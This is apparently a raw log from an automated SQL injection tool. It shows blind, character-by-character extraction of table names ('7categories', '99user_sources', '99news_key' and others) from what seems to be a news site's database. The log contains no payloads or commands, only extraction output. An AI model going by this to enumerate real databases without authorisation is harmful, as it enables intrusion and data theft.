+[01:05:15] [INFO] retrieved: ___________[01:05:15] [INFO] retrieved: [01:05:35] [INFO] retrieved: __a________ 1/11 (9%)[01:05:38] [INFO] retrieved: _ca________ 2/11 (18%)[01:05:45] [INFO] retrieved: 7ca________ 3/11 (27%)[01:05:49] [INFO] retrieved: 7ca_e______ 4/11 (36%)[01:05:52] [INFO] retrieved: 7cate______ 5/11 (45%)[01:06:01] [INFO] retrieved: 7categ_____ 6/11 (54%)[01:06:08] [INFO] retrieved: 7categ_r___ 7/11 (63%)[01:06:10] [INFO] retrieved: 7categ_ri__ 8/11 (72%)[01:06:15] [INFO] retrieved: 7categori__ 9/11 (81%)[01:06:16] [INFO] retrieved: 7categorie_ 10/11 (90%)[01:06:21] [INFO] retrieved: 7categories             [01:06:21] [INFO] retrieved: 7categories
+[01:06:21] [INFO] retrieving the length of query output
+[01:06:21] [INFO] retrieved: 16
+[01:06:34] [INFO] retrieved: ________________[01:06:34] [INFO] retrieved: [01:06:57] [INFO] retrieved: _c______________ 1/16 (6%)[01:07:04] [INFO] retrieved: 7c______________ 2/16 (12%)[01:07:05] [INFO] retrieved: 7c_s____________ 3/16 (18%)[01:07:06] [INFO] retrieved: 7cus____________ 4/16 (25%)[01:07:27] [INFO] retrieved: 7cust___________ 5/16 (31%)[01:07:28] [INFO] retrieved: 7cust_m_________ 6/16 (37%)[01:07:34] [INFO] retrieved: 7custom_________ 7/16 (43%)[01:07:43] [INFO] retrieved: 7custom__e______ 8/16 (50%)[01:07:49] [INFO] retrieved: 7custom__e______ 9/16 (56%)[01:07:50] [INFO] retrieved: 7custom_se______ 10/16 (62%)[01:07:51] [INFO] retrieved: 7custom_sec_____ 11/16 (68%)[01:08:05] [INFO] retrieved: 7custom_sec_i___ 12/16 (75%)[01:08:12] [INFO] retrieved: 7custom_secti___ 13/16 (81%)[01:08:18] [INFO] retrieved: 7custom_sectio__ 14/16 (87%)[01:08:18] [INFO] retrieved: 7custom_section_ 15/16 (93%)[01:08:21] [INFO] retrieved: 7custom_sections             [01:08:22] [INFO] retrieved: 7custom_sections
+[01:08:22] [INFO] retrieving the length of query output
+[01:08:22] [INFO] retrieved: 13
+[01:08:35] [INFO] retrieved: _____________[01:08:35] [INFO] retrieved: [01:08:57] [INFO] retrieved: _c___________ 1/13 (7%)[01:09:05] [INFO] retrieved: 7c___________ 2/13 (15%)[01:09:06] [INFO] retrieved: 7c_s_________ 3/13 (23%)[01:09:06] [INFO] retrieved: 7cus_________ 4/13 (30%)[01:09:28] [INFO] retrieved: 7cust________ 5/13 (38%)[01:09:29] [INFO] retrieved: 7cust_m______ 6/13 (46%)[01:09:36] [INFO] retrieved: 7custom______ 7/13 (53%)[01:09:46] [INFO] retrieved: 7custom__i___ 8/13 (61%)[01:09:48] [INFO] retrieved: 7custom__i___ 9/13 (69%)[01:09:54] [INFO] retrieved: 7custom_ti___ 10/13 (76%)[01:10:00] [INFO] retrieved: 7custom_ti_e_ 11/13 (84%)[01:10:00] [INFO] retrieved: 7custom_tile_ 12/13 (92%)[01:10:03] [INFO] retrieved: 7custom_tiles             [01:10:03] [INFO] retrieved: 7custom_tiles
+[01:10:03] [INFO] retrieving the length of query output
+[01:10:03] [INFO] retrieved: 15
+[01:10:14] [INFO] retrieved: _______________[01:10:14] [INFO] retrieved: [01:10:40] [INFO] retrieved: ___e___________ 1/15 (6%)[01:10:44] [INFO] retrieved: __re___________ 2/15 (13%)[01:10:46] [INFO] retrieved: 7_re___________ 3/15 (20%)[01:10:46] [INFO] retrieved: 7fre___________ 4/15 (26%)[01:10:57] [INFO] retrieved: 7free__________ 5/15 (33%)[01:11:04] [INFO] retrieved: 7free__e_______ 6/15 (40%)[01:11:06] [INFO] retrieved: 7freeu_e_______ 7/15 (46%)[01:11:06] [INFO] retrieved: 7freeuse_______ 8/15 (53%)[01:11:20] [INFO] retrieved: 7freeuser______ 9/15 (60%)[01:11:23] [INFO] retrieved: 7freeuser__i___ 10/15 (66%)[01:11:34] [INFO] retrieved: 7freeuser_ti___ 11/15 (73%)[01:11:40] [INFO] retrieved: 7freeuser_ti_e_ 12/15 (80%)[01:11:42] [INFO] retrieved: 7freeuser_ti_e_ 13/15 (86%)[01:11:45] [INFO] retrieved: 7freeuser_tile_ 14/15 (93%)[01:11:49] [INFO] retrieved: 7freeuser_tiles             [01:11:49] [INFO] retrieved: 7freeuser_tiles
+[01:11:49] [INFO] retrieving the length of query output
+[01:11:49] [INFO] retrieved: 12
+[01:12:03] [INFO] retrieved: ____________[01:12:03] [INFO] retrieved: [01:12:29] [INFO] retrieved: _i__________ 1/12 (8%)[01:12:34] [INFO] retrieved: _i_g________ 2/12 (16%)[01:12:35] [INFO] retrieved: _img________ 3/12 (25%)[01:12:35] [INFO] retrieved: 7img________ 4/12 (33%)[01:12:51] [INFO] retrieved: 7img__b_____ 5/12 (41%)[01:12:53] [INFO] retrieved: 7img__bi____ 6/12 (50%)[01:12:59] [INFO] retrieved: 7img_fbi____ 7/12 (58%)[01:13:09] [INFO] retrieved: 7img_fbi____ 8/12 (66%)[01:13:15] [INFO] retrieved: 7img_fbid___ 9/12 (75%)[01:13:16] [INFO] retrieved: 7img_fbidd__ 10/12 (83%)[01:13:16] [INFO] retrieved: 7img_fbidde_ 11/12 (91%)[01:13:25] [INFO] retrieved: 7img_fbidden             [01:13:25] [INFO] retrieved: 7img_fbidden
+[01:13:25] [INFO] retrieving the length of query output
+[01:13:25] [INFO] retrieved: 5
+[01:13:34] [INFO] retrieved: _____[01:13:34] [INFO] retrieved: [01:13:58] [INFO] retrieved: __e__ 1/5 (20%)[01:14:05] [INFO] retrieved: 7_e__ 2/5 (40%)[01:14:06] [INFO] retrieved: 7ke__ 3/5 (60%)[01:14:06] [INFO] retrieved: 7key_ 4/5 (80%)[01:14:14] [INFO] retrieved: 7keyw           [01:14:14] [INFO] retrieved: 7keyw
+[01:14:14] [INFO] retrieving the length of query output
+[01:14:14] [INFO] retrieved: 13
+[01:14:27] [INFO] retrieved: _____________[01:14:27] [INFO] retrieved: [01:14:52] [INFO] retrieved: __i__________ 1/13 (7%)[01:14:58] [INFO] retrieved: __is_________ 2/13 (15%)[01:14:59] [INFO] retrieved: 7_is_________ 3/13 (23%)[01:15:05] [INFO] retrieved: 7lis_________ 4/13 (30%)[01:15:20] [INFO] retrieved: 7list________ 5/13 (38%)[01:15:21] [INFO] retrieved: 7list_s______ 6/13 (46%)[01:15:34] [INFO] retrieved: 7list_so_____ 7/13 (53%)[01:15:42] [INFO] retrieved: 7list_so_____ 8/13 (61%)[01:15:43] [INFO] retrieved: 7list_so_r___ 9/13 (69%)[01:15:44] [INFO] retrieved: 7list_sour___ 10/13 (76%)[01:15:49] [INFO] retrieved: 7list_sourc__ 11/13 (84%)[01:15:53] [INFO] retrieved: 7list_source_ 12/13 (92%)[01:15:56] [INFO] retrieved: 7list_sources             [01:15:56] [INFO] retrieved: 7list_sources
+[01:15:56] [INFO] retrieving the length of query output
+[01:15:56] [INFO] retrieved: 6
+[01:16:06] [INFO] retrieved: ______[01:16:06] [INFO] retrieved: [01:16:30] [INFO] retrieved: __i___ 1/6 (16%)[01:16:37] [INFO] retrieved: 7_i___ 2/6 (33%)[01:16:38] [INFO] retrieved: 7_is__ 3/6 (50%)[01:16:43] [INFO] retrieved: 7lis__ 4/6 (66%)[01:16:50] [INFO] retrieved: 7list_ 5/6 (83%)[01:16:51] [INFO] retrieved: 7lists           [01:16:51] [INFO] retrieved: 7lists
+[01:16:51] [INFO] retrieving the length of query output
+[01:16:51] [INFO] retrieved: 13
+[01:17:05] [INFO] retrieved: _____________[01:17:05] [INFO] retrieved: [01:17:21] [INFO] retrieved: __a__________ 1/13 (7%)[01:17:30] [INFO] retrieved: __ai_________ 2/13 (15%)[01:17:34] [INFO] retrieved: _mai_________ 3/13 (23%)[01:17:35] [INFO] retrieved: 7mai_________ 4/13 (30%)[01:17:49] [INFO] retrieved: 7main________ 5/13 (38%)[01:17:57] [INFO] retrieved: 7main_s______ 6/13 (46%)[01:18:04] [INFO] retrieved: 7main_so_____ 7/13 (53%)[01:18:12] [INFO] retrieved: 7main_so_____ 8/13 (61%)[01:18:14] [INFO] retrieved: 7main_sou____ 9/13 (69%)[01:18:21] [INFO] retrieved: 7main_sou_c__ 10/13 (76%)[01:18:21] [INFO] retrieved: 7main_sourc__ 11/13 (84%)[01:18:27] [INFO] retrieved: 7main_source_ 12/13 (92%)[01:18:29] [INFO] retrieved: 7main_sources             [01:18:29] [INFO] retrieved: 7main_sources
+[01:18:29] [INFO] retrieving the length of query output
+[01:18:29] [INFO] retrieved: 5
+[01:18:36] [INFO] retrieved: _____[01:18:36] [INFO] retrieved: [01:19:00] [INFO] retrieved: __e__ 1/5 (20%)[01:19:07] [INFO] retrieved: 7_e__ 2/5 (40%)[01:19:10] [INFO] retrieved: 7ne__ 3/5 (60%)[01:19:11] [INFO] retrieved: 7new_ 4/5 (80%)[01:19:15] [INFO] retrieved: 7news           [01:19:15] [INFO] retrieved: 7news
+[01:19:15] [INFO] retrieving the length of query output
+[01:19:15] [INFO] retrieved: 9
+[01:19:25] [INFO] retrieved: _________[01:19:25] [INFO] retrieved: [01:19:49] [INFO] retrieved: __e______ 1/9 (11%)[01:19:57] [INFO] retrieved: 7_e______ 2/9 (22%)[01:20:04] [INFO] retrieved: 7ne______ 3/9 (33%)[01:20:05] [INFO] retrieved: 7new_____ 4/9 (44%)[01:20:12] [INFO] retrieved: 7news____ 5/9 (55%)[01:20:16] [INFO] retrieved: 7news__a_ 6/9 (66%)[01:20:20] [INFO] retrieved: 7news_ca_ 7/9 (77%)[01:20:28] [INFO] retrieved: 7news_ca_ 8/9 (88%)[01:20:29] [INFO] retrieved: 7news_cat           [01:20:29] [INFO] retrieved: 7news_cat
+[01:20:29] [INFO] retrieving the length of query output
+[01:20:29] [INFO] retrieved: 9
+[01:20:39] [INFO] retrieved: _________[01:20:39] [INFO] retrieved: [01:21:03] [INFO] retrieved: __e______ 1/9 (11%)[01:21:10] [INFO] retrieved: 7_e______ 2/9 (22%)[01:21:18] [INFO] retrieved: 7ne______ 3/9 (33%)[01:21:18] [INFO] retrieved: 7new_____ 4/9 (44%)[01:21:26] [INFO] retrieved: 7news____ 5/9 (55%)[01:21:36] [INFO] retrieved: 7news__e_ 6/9 (66%)[01:21:37] [INFO] retrieved: 7news_ke_ 7/9 (77%)[01:21:42] [INFO] retrieved: 7news_key 8/9 (88%)[01:21:43] [INFO] retrieved: 7news_key           [01:21:43] [INFO] retrieved: 7news_key
+[01:21:43] [INFO] retrieving the length of query output
+[01:21:43] [INFO] retrieved: 7
+[01:21:48] [INFO] retrieved: _______[01:21:48] [INFO] retrieved: [01:22:06] [INFO] retrieved: ___a___ 1/7 (14%)[01:22:19] [INFO] retrieved: _s_a___ 2/7 (28%)[01:22:19] [INFO] retrieved: 7s_a___ 3/7 (42%)[01:22:23] [INFO] retrieved: 7sha___ 4/7 (57%)[01:22:26] [INFO] retrieved: 7shar__ 5/7 (71%)[01:22:31] [INFO] retrieved: 7share_ 6/7 (85%)[01:22:33] [INFO] retrieved: 7shares           [01:22:33] [INFO] retrieved: 7shares
+[01:22:33] [INFO] retrieving the length of query output
+[01:22:33] [INFO] retrieved: 8
+[01:22:43] [INFO] retrieved: ________[01:22:43] [INFO] retrieved: [01:23:16] [INFO] retrieved: _s______ 1/8 (12%)[01:23:16] [INFO] retrieved: 7s______ 2/8 (25%)[01:23:16] [INFO] retrieved: 7s_u____ 3/8 (37%)[01:23:21] [INFO] retrieved: 7sou____ 4/8 (50%)[01:23:32] [INFO] retrieved: 7sou__e_ 5/8 (62%)[01:23:33] [INFO] retrieved: 7sou_ce_ 6/8 (75%)[01:23:34] [INFO] retrieved: 7source_ 7/8 (87%)[01:23:37] [INFO] retrieved: 7sources           [01:23:37] [INFO] retrieved: 7sources
+[01:23:37] [INFO] retrieving the length of query output
+[01:23:37] [INFO] retrieved: 17
+[01:23:48] [INFO] retrieved: _________________[01:23:48] [INFO] retrieved: [01:24:20] [INFO] retrieved: _s_______________ 1/17 (5%)[01:24:20] [INFO] retrieved: _s_u_____________ 2/17 (11%)[01:24:20] [INFO] retrieved: 7s_u_____________ 3/17 (17%)[01:24:28] [INFO] retrieved: 7sou_____________ 4/17 (23%)[01:24:36] [INFO] retrieved: 7sou_c___________ 5/17 (29%)[01:24:37] [INFO] retrieved: 7sou_ce__________ 6/17 (35%)[01:24:43] [INFO] retrieved: 7source__________ 7/17 (41%)[01:24:51] [INFO] retrieved: 7sources_________ 8/17 (47%)[01:24:53] [INFO] retrieved: 7sources_i_______ 9/17 (52%)[01:25:03] [INFO] retrieved: 7sources_i_a_____ 10/17 (58%)[01:25:14] [INFO] retrieved: 7sources_ina_____ 11/17 (64%)[01:25:21] [INFO] retrieved: 7sources_ina_____ 12/17 (70%)[01:25:29] [INFO] retrieved: 7sources_inap____ 13/17 (76%)[01:25:33] [INFO] retrieved: 7sources_inap__a_ 14/17 (82%)[01:25:35] [INFO] retrieved: 7sources_inapp_a_ 15/17 (88%)[01:25:43] [INFO] retrieved: 7sources_inapp_ad 16/17 (94%)[01:25:46] [INFO] retrieved: 7sources_inapp_ad             [01:25:46] [INFO] retrieved: 7sources_inapp_ad
+[01:25:46] [INFO] retrieving the length of query output
+[01:25:46] [INFO] retrieved: 7
+[01:25:50] [INFO] retrieved: _______[01:25:50] [INFO] retrieved: [01:26:14] [INFO] retrieved: ___e___ 1/7 (14%)[01:26:22] [INFO] retrieved: 7__e___ 2/7 (28%)[01:26:22] [INFO] retrieved: 7u_e___ 3/7 (42%)[01:26:22] [INFO] retrieved: 7use___ 4/7 (57%)[01:26:32] [INFO] retrieved: 7use__1 5/7 (71%)[01:26:32] [INFO] retrieved: 7user_1 6/7 (85%)[01:26:43] [INFO] retrieved: 7user_1           [01:26:43] [INFO] retrieved: 7user_1
+[01:26:43] [INFO] retrieving the length of query output
+[01:26:43] [INFO] retrieved: 7
+[01:26:47] [INFO] retrieved: _______[01:26:47] [INFO] retrieved: [01:27:11] [INFO] retrieved: ___e___ 1/7 (14%)[01:27:17] [INFO] retrieved: 7__e___ 2/7 (28%)[01:27:18] [INFO] retrieved: 7u_e___ 3/7 (42%)[01:27:18] [INFO] retrieved: 7use___ 4/7 (57%)[01:27:30] [INFO] retrieved: 7user__ 5/7 (71%)[01:27:32] [INFO] retrieved: 7user_7 6/7 (85%)[01:27:40] [INFO] retrieved: 7user_7           [01:27:40] [INFO] retrieved: 7user_7
+[01:27:40] [INFO] retrieving the length of query output
+[01:27:40] [INFO] retrieved: 9
+[01:27:49] [INFO] retrieved: _________[01:27:49] [INFO] retrieved: [01:28:14] [INFO] retrieved: ___e_____ 1/9 (11%)[01:28:20] [INFO] retrieved: 7__e_____ 2/9 (22%)[01:28:21] [INFO] retrieved: 7_se_____ 3/9 (33%)[01:28:21] [INFO] retrieved: 7use_____ 4/9 (44%)[01:28:31] [INFO] retrieved: 7use___a_ 5/9 (55%)[01:28:38] [INFO] retrieved: 7user__a_ 6/9 (66%)[01:28:38] [INFO] retrieved: 7user_ca_ 7/9 (77%)[01:28:49] [INFO] retrieved: 7user_ca_ 8/9 (88%)[01:28:49] [INFO] retrieved: 7user_cat           [01:28:49] [INFO] retrieved: 7user_cat
+[01:28:49] [INFO] retrieving the length of query output
+[01:28:49] [INFO] retrieved: 15
+[01:29:00] [INFO] retrieved: _______________[01:29:00] [INFO] retrieved: [01:29:25] [INFO] retrieved: ___e___________ 1/15 (6%)[01:29:31] [INFO] retrieved: 7__e___________ 2/15 (13%)[01:29:31] [INFO] retrieved: 7_se___________ 3/15 (20%)[01:29:32] [INFO] retrieved: 7use___________ 4/15 (26%)[01:29:47] [INFO] retrieved: 7user__________ 5/15 (33%)[01:29:48] [INFO] retrieved: 7user__i_______ 6/15 (40%)[01:30:01] [INFO] retrieved: 7user_li_______ 7/15 (46%)[01:30:10] [INFO] retrieved: 7user_li_______ 8/15 (53%)[01:30:11] [INFO] retrieved: 7user_lis______ 9/15 (60%)[01:30:16] [INFO] retrieved: 7user_list_____ 10/15 (66%)[01:30:24] [INFO] retrieved: 7user_lists____ 11/15 (73%)[01:30:32] [INFO] retrieved: 7user_lists_f__ 12/15 (80%)[01:30:43] [INFO] retrieved: 7user_lists_fo_ 13/15 (86%)[01:30:46] [INFO] retrieved: 7user_lists_fol 14/15 (93%)[01:30:47] [INFO] retrieved: 7user_lists_fol             [01:30:47] [INFO] retrieved: 7user_lists_fol
+[01:30:47] [INFO] retrieving the length of query output
+[01:30:47] [INFO] retrieved: 13
+[01:31:00] [INFO] retrieved: _____________[01:31:00] [INFO] retrieved: [01:31:23] [INFO] retrieved: ___e_________ 1/13 (7%)[01:31:30] [INFO] retrieved: __se_________ 2/13 (15%)[01:31:31] [INFO] retrieved: 7_se_________ 3/13 (23%)[01:31:31] [INFO] retrieved: 7use_________ 4/13 (30%)[01:31:46] [INFO] retrieved: 7user________ 5/13 (38%)[01:31:54] [INFO] retrieved: 7user_s______ 6/13 (46%)[01:32:02] [INFO] retrieved: 7user_so_____ 7/13 (53%)[01:32:11] [INFO] retrieved: 7user_sou____ 8/13 (61%)[01:32:14] [INFO] retrieved: 7user_sou____ 9/13 (69%)[01:32:19] [INFO] retrieved: 7user_sour___ 10/13 (76%)[01:32:19] [INFO] retrieved: 7user_sourc__ 11/13 (84%)[01:32:25] [INFO] retrieved: 7user_source_ 12/13 (92%)[01:32:27] [INFO] retrieved: 7user_sources             [01:32:27] [INFO] retrieved: 7user_sources
+[01:32:27] [INFO] retrieving the length of query output
+[01:32:27] [INFO] retrieved: 9
+[01:32:37] [INFO] retrieved: _________[01:32:37] [INFO] retrieved: [01:32:58] [INFO] retrieved: __a______ 1/9 (11%)[01:33:01] [INFO] retrieved: _9a______ 2/9 (22%)[01:33:01] [INFO] retrieved: 99a______ 3/9 (33%)[01:33:09] [INFO] retrieved: 99ar_____ 4/9 (44%)[01:33:24] [INFO] retrieved: 99art____ 5/9 (55%)[01:33:25] [INFO] retrieved: 99art_k__ 6/9 (66%)[01:33:26] [INFO] retrieved: 99art_ke_ 7/9 (77%)[01:33:34] [INFO] retrieved: 99art_ke_ 8/9 (88%)[01:33:35] [INFO] retrieved: 99art_key           [01:33:35] [INFO] retrieved: 99art_key
+[01:33:35] [INFO] retrieving the length of query output
+[01:33:35] [INFO] retrieved: 12
+[01:33:47] [INFO] retrieved: ____________[01:33:47] [INFO] retrieved: [01:34:05] [INFO] retrieved: __a_________ 1/12 (8%)[01:34:11] [INFO] retrieved: 9_a_________ 2/12 (16%)[01:34:12] [INFO] retrieved: 99a_________ 3/12 (25%)[01:34:16] [INFO] retrieved: 99ar________ 4/12 (33%)[01:34:32] [INFO] retrieved: 99art_______ 5/12 (41%)[01:34:35] [INFO] retrieved: 99art_s_____ 6/12 (50%)[01:34:44] [INFO] retrieved: 99art_so____ 7/12 (58%)[01:34:51] [INFO] retrieved: 99art_so____ 8/12 (66%)[01:34:53] [INFO] retrieved: 99art_sou___ 9/12 (75%)[01:34:56] [INFO] retrieved: 99art_sour__ 10/12 (83%)[01:34:58] [INFO] retrieved: 99art_sourc_ 11/12 (91%)[01:35:01] [INFO] retrieved: 99art_source             [01:35:01] [INFO] retrieved: 99art_source
+[01:35:01] [INFO] retrieving the length of query output
+[01:35:01] [INFO] retrieved: 10
+[01:35:12] [INFO] retrieved: __________[01:35:12] [INFO] retrieved: [01:35:31] [INFO] retrieved: __a_______ 1/10 (10%)[01:35:36] [INFO] retrieved: _9a_______ 2/10 (20%)[01:35:36] [INFO] retrieved: 99a_______ 3/10 (30%)[01:35:42] [INFO] retrieved: 99ar______ 4/10 (40%)[01:35:52] [INFO] retrieved: 99ar_i____ 5/10 (50%)[01:35:53] [INFO] retrieved: 99ar_ic___ 6/10 (60%)[01:35:58] [INFO] retrieved: 99artic___ 7/10 (70%)[01:36:05] [INFO] retrieved: 99articl__ 8/10 (80%)[01:36:06] [INFO] retrieved: 99article_ 9/10 (90%)[01:36:09] [INFO] retrieved: 99articles             [01:36:09] [INFO] retrieved: 99articles
+[01:36:09] [INFO] retrieving the length of query output
+[01:36:09] [INFO] retrieved: 12
+[01:36:20] [INFO] retrieved: ____________[01:36:20] [INFO] retrieved: [01:36:40] [INFO] retrieved: __a_________ 1/12 (8%)[01:36:44] [INFO] retrieved: 9_a_________ 2/12 (16%)[01:36:45] [INFO] retrieved: 99a_________ 3/12 (25%)[01:36:52] [INFO] retrieved: 99ar________ 4/12 (33%)[01:37:01] [INFO] retrieved: 99ar__c_____ 5/12 (41%)[01:37:02] [INFO] retrieved: 99ar_ic_____ 6/12 (50%)[01:37:08] [INFO] retrieved: 99artic_____ 7/12 (58%)[01:37:19] [INFO] retrieved: 99artic_e___ 8/12 (66%)[01:37:20] [INFO] retrieved: 99article___ 9/12 (75%)[01:37:23] [INFO] retrieved: 99articles__ 10/12 (83%)[01:37:28] [INFO] retrieved: 99articles_1 11/12 (91%)[01:37:34] [INFO] retrieved: 99articles_1             [01:37:34] [INFO] retrieved: 99articles_1
+[01:37:34] [INFO] retrieving the length of query output
+[01:37:34] [INFO] retrieved: 12
+[01:37:45] [INFO] retrieved: ____________[01:37:45] [INFO] retrieved: [01:38:04] [INFO] retrieved: ___a________ 1/12 (8%)[01:38:09] [INFO] retrieved: __ca________ 2/12 (16%)[01:38:09] [INFO] retrieved: 9_ca________ 3/12 (25%)[01:38:10] [INFO] retrieved: 99ca________ 4/12 (33%)[01:38:27] [INFO] retrieved: 99ca_e______ 5/12 (41%)[01:38:32] [INFO] retrieved: 99ca_eg_____ 6/12 (50%)[01:38:32] [INFO] retrieved: 99categ_____ 7/12 (58%)[01:38:41] [INFO] retrieved: 99catego____ 8/12 (66%)[01:38:48] [INFO] retrieved: 99categor___ 9/12 (75%)[01:38:49] [INFO] retrieved: 99categori__ 10/12 (83%)[01:38:50] [INFO] retrieved: 99categorie_ 11/12 (91%)[01:38:54] [INFO] retrieved: 99categories             [01:38:54] [INFO] retrieved: 99categories
+[01:38:54] [INFO] retrieving the length of query output
+[01:38:54] [INFO] retrieved: 6
+[01:39:04] [INFO] retrieved: ______[01:39:04] [INFO] retrieved: [01:39:27] [INFO] retrieved: ___e__ 1/6 (16%)[01:39:28] [INFO] retrieved: 9__e__ 2/6 (33%)[01:39:28] [INFO] retrieved: 99_e__ 3/6 (50%)[01:39:32] [INFO] retrieved: 99ke__ 4/6 (66%)[01:39:41] [INFO] retrieved: 99key_ 5/6 (83%)[01:39:44] [INFO] retrieved: 99keyw           [01:39:44] [INFO] retrieved: 99keyw
+[01:39:44] [INFO] retrieving the length of query output
+[01:39:44] [INFO] retrieved: 6
+[01:39:53] [INFO] retrieved: ______[01:39:53] [INFO] retrieved: [01:40:17] [INFO] retrieved: ___e__ 1/6 (16%)[01:40:18] [INFO] retrieved: _9_e__ 2/6 (33%)[01:40:18] [INFO] retrieved: 99_e__ 3/6 (50%)[01:40:28] [INFO] retrieved: 99ne__ 4/6 (66%)[01:40:34] [INFO] retrieved: 99ne_s 5/6 (83%)[01:40:36] [INFO] retrieved: 99news           [01:40:36] [INFO] retrieved: 99news
+[01:40:36] [INFO] retrieving the length of query output
+[01:40:36] [INFO] retrieved: 10
+[01:40:47] [INFO] retrieved: __________[01:40:47] [INFO] retrieved: [01:41:12] [INFO] retrieved: ___e______ 1/10 (10%)[01:41:12] [INFO] retrieved: 9__e______ 2/10 (20%)[01:41:12] [INFO] retrieved: 99_e______ 3/10 (30%)[01:41:21] [INFO] retrieved: 99ne______ 4/10 (40%)[01:41:36] [INFO] retrieved: 99ne_s____ 5/10 (50%)[01:41:38] [INFO] retrieved: 99ne_s_c__ 6/10 (60%)[01:41:42] [INFO] retrieved: 99news_c__ 7/10 (70%)[01:41:46] [INFO] retrieved: 99news_ca_ 8/10 (80%)[01:41:49] [INFO] retrieved: 99news_ca_ 9/10 (90%)[01:41:54] [INFO] retrieved: 99news_cat             [01:41:54] [INFO] retrieved: 99news_cat
+[01:41:54] [INFO] retrieving the length of query output
+[01:41:54] [INFO] retrieved: 10
+[01:42:05] [INFO] retrieved: __________[01:42:05] [INFO] retrieved: [01:42:30] [INFO] retrieved: ___e______ 1/10 (10%)[01:42:30] [INFO] retrieved: 9__e______ 2/10 (20%)[01:42:30] [INFO] retrieved: 99_e______ 3/10 (30%)[01:42:41] [INFO] retrieved: 99ne______ 4/10 (40%)[01:42:52] [INFO] retrieved: 99ne_s____ 5/10 (50%)[01:42:59] [INFO] retrieved: 99news____ 6/10 (60%)[01:43:00] [INFO] retrieved: 99news_k__ 7/10 (70%)[01:43:06] [INFO] retrieved: 99news_ke_ 8/10 (80%)[01:43:10] [INFO] retrieved: 99news_ke_ 9/10 (90%)[01:43:13] [INFO] retrieved: 99news_key             [01:43:13] [INFO] retrieved: 99news_key
+[01:43:13] [INFO] retrieving the length of query output
+[01:43:13] [INFO] retrieved: 8
+[01:43:23] [INFO] retrieved: ________[01:43:23] [INFO] retrieved: [01:43:48] [INFO] retrieved: 9_______ 1/8 (12%)[01:43:48] [INFO] retrieved: 99______ 2/8 (25%)[01:43:55] [INFO] retrieved: 99s_____ 3/8 (37%)[01:44:01] [INFO] retrieved: 99sh____ 4/8 (50%)[01:44:13] [INFO] retrieved: 99sh__e_ 5/8 (62%)[01:44:18] [INFO] retrieved: 99sh__es 6/8 (75%)[01:44:20] [INFO] retrieved: 99sh_res 7/8 (87%)[01:44:21] [INFO] retrieved: 99shares           [01:44:21] [INFO] retrieved: 99shares
+[01:44:21] [INFO] retrieving the length of query output
+[01:44:21] [INFO] retrieved: 9
+[01:44:26] [INFO] retrieved: _________[01:44:26] [INFO] retrieved: [01:44:50] [INFO] retrieved: 9________ 1/9 (11%)[01:44:51] [INFO] retrieved: 99_______ 2/9 (22%)[01:44:58] [INFO] retrieved: 99s______ 3/9 (33%)[01:45:05] [INFO] retrieved: 99so_____ 4/9 (44%)[01:45:14] [INFO] retrieved: 99so__c__ 5/9 (55%)[01:45:23] [INFO] retrieved: 99so__ce_ 6/9 (66%)[01:45:25] [INFO] retrieved: 99so_rce_ 7/9 (77%)[01:45:30] [INFO] retrieved: 99so_rces 8/9 (88%)[01:45:31] [INFO] retrieved: 99sources           [01:45:31] [INFO] retrieved: 99sources
+[01:45:31] [INFO] retrieving the length of query output
+[01:45:31] [INFO] retrieved: 8
+[01:45:41] [INFO] retrieved: ________[01:45:41] [INFO] retrieved: [01:46:06] [INFO] retrieved: 9_______ 1/8 (12%)[01:46:06] [INFO] retrieved: 99______ 2/8 (25%)[01:46:09] [INFO] retrieved: 99u_____ 3/8 (37%)[01:46:15] [INFO] retrieved: 99us____ 4/8 (50%)[01:46:27] [INFO] retrieved: 99us___1 5/8 (62%)[01:46:37] [INFO] retrieved: 99use__1 6/8 (75%)[01:46:38] [INFO] retrieved: 99user_1 7/8 (87%)[01:46:41] [INFO] retrieved: 99user_1           [01:46:41] [INFO] retrieved: 99user_1
+[01:46:41] [INFO] retrieving the length of query output
+[01:46:41] [INFO] retrieved: 10
+[01:46:53] [INFO] retrieved: __________[01:46:53] [INFO] retrieved: [01:47:18] [INFO] retrieved: 9_________ 1/10 (10%)[01:47:20] [INFO] retrieved: 99________ 2/10 (20%)[01:47:27] [INFO] retrieved: 99u_______ 3/10 (30%)[01:47:28] [INFO] retrieved: 99us______ 4/10 (40%)[01:47:44] [INFO] retrieved: 99us___c__ 5/10 (50%)[01:47:57] [INFO] retrieved: 99us___ca_ 6/10 (60%)[01:47:57] [INFO] retrieved: 99us_r_ca_ 7/10 (70%)[01:47:58] [INFO] retrieved: 99user_ca_ 8/10 (80%)[01:48:04] [INFO] retrieved: 99user_ca_ 9/10 (90%)[01:48:11] [INFO] retrieved: 99user_cat             [01:48:11] [INFO] retrieved: 99user_cat
+[01:48:11] [INFO] retrieving the length of query output
+[01:48:11] [INFO] retrieved: 14
+[01:48:19] [INFO] retrieved: ______________[01:48:19] [INFO] retrieved: [01:48:44] [INFO] retrieved: 9_____________ 1/14 (7%)[01:48:45] [INFO] retrieved: 99____________ 2/14 (14%)[01:48:51] [INFO] retrieved: 99_s__________ 3/14 (21%)[01:48:52] [INFO] retrieved: 99us__________ 4/14 (28%)[01:49:16] [INFO] retrieved: 99us___s______ 5/14 (35%)[01:49:22] [INFO] retrieved: 99use__s______ 6/14 (42%)[01:49:23] [INFO] retrieved: 99user_s______ 7/14 (50%)[01:49:31] [INFO] retrieved: 99user_s______ 8/14 (57%)[01:49:45] [INFO] retrieved: 99user_so_____ 9/14 (64%)[01:49:47] [INFO] retrieved: 99user_so_r___ 10/14 (71%)[01:49:48] [INFO] retrieved: 99user_sour___ 11/14 (78%)[01:49:49] [INFO] retrieved: 99user_sourc__ 12/14 (85%)[01:49:56] [INFO] retrieved: 99user_source_ 13/14 (92%)[01:49:58] [INFO] retrieved: 99user_sources             [01:49:58] [INFO] retrieved: 99user_sources
+[01:49:58] [INFO] retrieving the length of query output
+[01:49:58] [INFO] retrieved: 13
